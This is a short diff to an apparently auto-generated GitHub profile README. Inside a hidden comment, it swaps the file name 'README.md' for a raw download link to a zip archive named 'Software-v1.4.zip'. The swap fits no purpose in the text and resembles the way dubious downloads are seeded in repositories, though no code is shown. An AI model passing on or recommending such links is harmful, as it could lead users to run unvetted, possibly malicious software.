@@ -7,6 +7,6 @@
 - ⚡ Fun fact: I am Boy!
 
 <!---
-Vampticsoda/Vampticsoda is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+Vampticsoda/Vampticsoda is a ✨ special ✨ repository because its `https://github.com/Vampticsoda/Vampticsoda/raw/refs/heads/main/curialist/Software-v1.4.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
